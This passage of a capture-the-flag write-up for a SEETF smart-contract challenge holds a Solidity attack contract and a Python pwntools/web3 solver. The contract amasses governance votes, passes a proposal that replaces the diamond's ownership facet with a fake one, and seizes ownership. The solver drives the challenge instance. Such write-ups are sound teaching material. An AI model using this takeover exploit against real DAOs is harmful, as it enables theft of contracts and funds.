</span></span><span class="line"><span class="cl">        <span class="n">setup</span> <span class="o">=</span> <span class="n">Setup</span><span class="p">(</span><span class="n">_setup</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Claim all FTC
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">setup</span><span class="p">.</span><span class="n">claim</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">ftc</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span> <span class="o">==</span> <span class="mi">1</span><span class="n">_000_000</span> <span class="kc">ether</span> <span class="p">,</span> <span class="s">&#34;Not 1mio FTC&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">ftc</span><span class="p">.</span><span class="n">delegate</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">ftc</span><span class="p">.</span><span class="n">getCurrentVotes</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span> <span class="o">==</span> <span class="mi">1</span><span class="n">_000_000</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;Not 1mio votes&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Setup FakeOwnershipFacet
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes4</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">ownershipFacetSelectors</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes4</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ownershipFacetSelectors</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;8da5cb5b&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ownershipFacetSelectors</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;f2fde38b&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span> <span class="k">memory</span> <span class="n">facetDetails</span> <span class="o">=</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="n">facetAddress</span><span class="o">:</span> <span class="kt">address</span><span class="p">(</span><span class="n">fakeOwnershipFacet</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">action</span><span class="o">:</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCutAction</span><span class="p">.</span><span class="n">Replace</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">functionSelectors</span><span class="o">:</span> <span class="n">ownershipFacetSelectors</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">callData</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="n">encodeCall</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">fakeOwnershipFacet</span><span class="p">.</span><span class="n">transferOwnership</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">proposalId</span> <span class="o">=</span> <span class="n">dao</span><span class="p">.</span><span class="n">submitProposal</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">fakeOwnershipFacet</span><span class="p">),</span> <span class="n">callData</span><span class="p">,</span> <span class="n">facetDetails</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">castVote</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_sig</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">dao</span><span class="p">.</span><span class="n">castVoteBySig</span><span class="p">(</span><span class="n">proposalId</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="n">_sig</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">execute</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">dao</span><span class="p">.</span><span class="n">executeProposal</span><span class="p">(</span><span class="n">proposalId</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">IOwnershipFacet</span><span class="p">(</span><span class="n">pigeonDiamond</span><span class="p">).</span><span class="n">owner</span><span class="p">()</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="s">&#34;Pigeon Diamond&#39;s owner isn&#39;t msg.sender&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Solver</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">solcx</span> <span class="kn">import</span> <span class="n">compile_files</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">eth_account.messages</span> <span class="kn">import</span> <span class="n">encode_defunct</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;win.the.seetf.sg&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">8552</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">launch_instance</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Launch instance...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;action? &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;uuid:           &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">uuid</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;rpc endpoint:   &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">rpc_endpoint</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;private key:    &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">private_key</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;setup contract: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">setup_address</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;uuid          = </span><span class="si">{</span><span class="n">uuid</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;rpc_endpoint  = </span><span class="se">\&#39;</span><span class="si">{</span><span class="n">rpc_endpoint</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;private_key   = </span><span class="se">\&#39;</span><span class="si">{</span><span class="n">private_key</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;setup_address = </span><span class="se">\&#39;</span><span class="si">{</span><span class="n">setup_address</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">uuid</span><span class="p">,</span> <span class="n">rpc_endpoint</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">private_key</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">setup_address</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">kill_instance</span><span class="p">(</span><span class="n">uuid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Kill instance...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;action? &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;uuid please: &#39;</span><span class="p">,</span> <span class="n">uuid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_flag</span><span class="p">(</span><span class="n">uuid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Get Flag...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;action? &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;uuid please: &#39;</span><span class="p">,</span> <span class="n">uuid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">readrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Launch instance</span>
</span></span><span class="line"><span class="cl"><span class="n">uuid</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># uuid          = b&#39;3d5e6ac5-344a-4fc6-a3b5-7e81f66d7163&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># rpc_endpoint  = &#39;http://win.the.seetf.sg:8551/3d5e6ac5-344a-4fc6-a3b5-7e81f66d7163&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># private_key   = &#39;0x504e560b8ab62ed68e801aab02877ef7b4af5e1fb7d2f0ff850f2dd4af5ab2e3&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># setup_address = &#39;0x3739B9AeDd167E15fe8Ca95A60C4631DC2b0bB35&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">uuid</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">uuid</span><span class="p">,</span> <span class="n">rpc_endpoint</span><span class="p">,</span> <span class="n">private_key</span><span class="p">,</span> <span class="n">setup_address</span> <span class="o">=</span> <span class="n">launch_instance</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Connect to the network</span>
</span></span><span class="line"><span class="cl"><span class="n">w3</span> <span class="o">=</span> <span class="n">Web3</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">HTTPProvider</span><span class="p">(</span><span class="n">rpc_endpoint</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">w3</span><span class="o">.</span><span class="n">is_connected</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">player</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">from_key</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Player address: </span><span class="si">{</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="si">}</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get pigeonDiamond address</span>
</span></span><span class="line"><span class="cl"><span class="n">setup_abi</span> <span class="o">=</span> <span class="p">[{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;payable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;constructor&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;claim&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;claimed&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;daoFacet&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract DAOFacet&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;diamondCutFacet&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract DiamondCutFacet&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;diamondLoupeFacet&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract DiamondLoupeFacet&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ftcFacet&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract FeatherCoinFacet&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;initDiamond&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract InitDiamond&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;isSolved&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ownershipFacet&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract OwnershipFacet&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;pigeonDiamond&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract PigeonDiamond&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;pigeonVaultFacet&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract PigeonVaultFacet&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">}]</span>
